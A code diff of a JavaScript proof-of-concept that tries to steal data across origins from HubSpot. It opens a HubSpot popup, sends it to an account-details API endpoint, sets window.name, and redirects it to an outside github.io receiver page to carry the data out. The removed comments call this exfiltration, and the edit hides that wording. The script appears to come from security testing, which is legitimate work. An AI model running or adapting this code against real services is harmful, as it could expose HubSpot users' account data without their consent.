@@ -33,7 +33,6 @@ function l(m) {
 
 l('START_origin=' + window.origin);
 
-// Open HubSpot
 l('opening_hubspot');
 let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
 
@@ -47,49 +46,42 @@ if (!hub) {
         attempts++;
         
         try {
-            // Try to access - will throw when cross-origin
             hub.origin;
             if (attempts % 20 === 0) l('waiting_' + attempts);
         } catch(e) {
             clearInterval(checker);
             l('hubspot_loaded_after_' + attempts);
             
-            // Now let's use the popup to navigate and exfiltrate data!
             setTimeout(() => {
                 l('STARTING_DATA_EXTRACTION');
                 
-                // Method 1: Navigate to a data API endpoint
+                // Navigate to HubSpot API
                 l('navigating_to_api');
                 hub.location = 'https://api.hubapi.com/account-info/v3/details';
-                
-                // The response will be displayed in the popup
-                // We can't read it, but we can detect if it loaded
                 
                 setTimeout(() => {
                     l('checking_if_api_loaded');
                     
                     try {
-                        // If we can access hub.location.href, it's same-origin (our origin)
                         let loc = hub.location.href;
                         l('STILL_ACCESSIBLE_url=' + loc.substring(0, 100));
                     } catch(err) {
-                        l('cross_origin_so_page_changed');
+                        l('cross_origin_confirmed');
                         
-                        // Method 2: Navigate to our exfil server with window.name
                         setTimeout(() => {
                             l('setting_window_name');
                             
-                            // Try to set window.name before navigating
                             try {
                                 hub.name = 'hubspot_data_' + Date.now();
                                 l('name_set=' + hub.name);
                             } catch(e) {
-                                l('name_error');
+                                l('name_error=' + e.message);
                             }
                             
-                            // Navigate to our domain to read window.name
-                            l('navigating_to_exfil_server');
-                            hub.location = E + '/receiver.html';
+                            // Navigate to GitHub to read window.name
+                            l('navigating_to_github');
+                            hub.location = 'https://majdch22.github.io/receiver.html';
+                            l('navigation_initiated');
                             
                         }, 2000);
                     }
